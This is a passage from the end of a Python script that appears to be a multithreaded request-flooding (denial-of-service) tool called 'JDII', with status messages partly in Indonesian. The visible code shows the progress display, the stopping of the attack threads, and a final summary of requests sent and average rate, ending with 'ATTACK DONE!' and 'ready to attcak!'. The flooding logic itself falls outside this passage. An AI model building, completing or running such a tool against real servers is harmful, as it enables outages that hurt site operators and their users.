                current_mode = mode
            
            print(f"\r[{bar}] {elapsed}s/{duration}s | "
                  f"Mode: {current_mode} | "
                  f"Req: {total_req:,} | "
                  f"Rate: {req_rate:.0f}/s | "
                  f"Remaining: {remaining}s", end="")
    
    except KeyboardInterrupt:
        print(f"\n\n{MERAH}[!] Attack stopping...{RESET}")
    
    # Stop all threads
    for t in all_threads:
        t.stop()
    
    # Wait for threads
    for t in all_threads:
        t.join(timeout=1)
    
    # Final stats
    total_requests = sum(t.requests_sent for t in all_threads)
    elapsed = int(time.time() - start_time)
    
    print(f"\n\n{HIJAU}════════════════════════════════════════════════════════════════{RESET}")
    print(f"{HIJAU}[✓] ATTACK DONE!{RESET}")
    print(f"{HIJAU}    Total requests: {total_requests:,}{RESET}")
    print(f"{HIJAU}    Duration: {elapsed} detik{RESET}")
    print(f"{HIJAU}    Average rate: {total_requests/elapsed:.0f} req/s{RESET}")
    print(f"{HIJAU}════════════════════════════════════════════════════════════════{RESET}")
    print(f"\n{CYAN}JDII - Just Do It Idiot - ready to attcak!{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{MERAH}[!] JDII terminated{RESET}")
    except Exception as e:
        print(f"\n{MERAH}[!] Error: {e}{RESET}")

